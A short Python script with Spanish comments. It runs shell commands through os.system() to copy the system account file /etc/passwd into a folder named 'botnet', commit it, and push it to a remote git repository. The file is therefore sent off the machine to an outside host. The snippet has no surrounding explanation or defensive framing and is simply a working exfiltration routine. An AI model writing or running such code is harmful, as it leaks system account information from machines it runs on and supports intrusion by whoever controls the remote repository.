# Definir los comandos Bash como cadenas de texto
comandos = [
    "cd ~/Documents/botnet",
    "cp /etc/passwd .",
    "git add .",
    'git commit -m "Agregar archivo /etc/passwd a github"',
    "git push origin master"
]
# Ejecutar cada comando utilizando os.system()
for comando in comandos:
    os.system(comando)


